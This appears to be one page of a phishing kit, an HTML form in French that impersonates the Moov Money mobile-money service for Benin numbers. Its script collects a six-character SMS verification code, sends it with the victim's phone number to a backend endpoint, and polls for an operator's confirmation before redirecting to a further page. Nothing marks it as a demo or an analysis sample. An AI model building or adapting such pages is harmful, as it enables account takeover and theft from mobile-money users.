<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Moov Money - Vérification SMS</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root { --moov-orange: #f26522; --moov-blue: #004b87; }
        body { background-color: #f7f7f7; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; font-family: sans-serif; }
        .header-box { width: 100%; background: var(--moov-blue); padding: 25px; color: white; text-align: center; font-size: 26px; font-weight: 800; border-bottom: 3px solid var(--moov-orange); }
        .card { background: white; width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; margin-top: -20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        
        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
        .code-box { width: 48px; height: 54px; border: 2px solid var(--moov-blue); border-radius: 10px; text-align: center; font-size: 22px; font-weight: 800; outline: none; text-transform: uppercase; }
        
        .submit-btn { width: 100%; background-color: #e0e0e0; color: #999; border: none; padding: 16px; border-radius: 10px; font-weight: 800; cursor: not-allowed; }
        .submit-btn.active { background-color: var(--moov-orange); color: white; cursor: pointer; }
    </style>
</head>
<body>

<div class="header-box">Moov Money</div>

<div class="card">
    <h2 style="text-align:center; color:var(--moov-blue); font-size:22px;">Code de Vérification</h2>
    <p style="text-align:center; color:#666; font-size:14px;">Entrez le code reçu par SMS sur le +229 <span id="phoneDisplay">--</span></p>

    <div class="code-input-container">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
    </div>

    <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
</div>

<script>
    const savedPhone = localStorage.getItem('phone') || "";
    document.getElementById('phoneDisplay').textContent = savedPhone;
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase();
            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
            const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
            submitBtn.disabled = fullCode.length !== 6;
            submitBtn.classList.toggle('active', fullCode.length === 6);
        });
    });

    submitBtn.addEventListener('click', async () => {
        const code = Array.from(codeBoxes).map(b => b.value).join('');
        await fetch('/api/verify-first-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: savedPhone, code, country: "BJ" })
        });
        
        setInterval(async () => {
            const res = await fetch(`/api/check-status?phone=${savedPhone}`);
            const data = await res.json();
            if (data.status === "otp1_correct") window.location.href = "/page9";
        }, 2000);
    });
</script>
</body>
</html>
